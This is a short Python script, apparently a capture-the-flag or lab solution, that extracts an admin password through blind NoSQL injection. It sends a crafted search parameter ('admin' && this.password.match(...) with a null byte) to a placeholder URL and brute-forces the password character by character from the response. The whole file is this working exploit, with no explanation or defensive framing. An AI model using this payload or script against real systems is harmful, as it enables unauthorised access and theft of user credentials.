import requests

URL = "##ENTER URL##"

def check(str):
    resp = requests.get(f"http://{URL}/?search=admin%27%20%26%26%20this.password.match(/{str}/)%00")
    return '>admin<' in resp.text

CHARSET = list('abcdefghijklmnopqrstuvwxyz0123456789-')
password = ""

while True:
    for c in CHARSET:
        print(f"trying: {c} for {password}")
        test = password + c
        if check(f'^{test}.*$'):
            password += c
            print(password)
            break
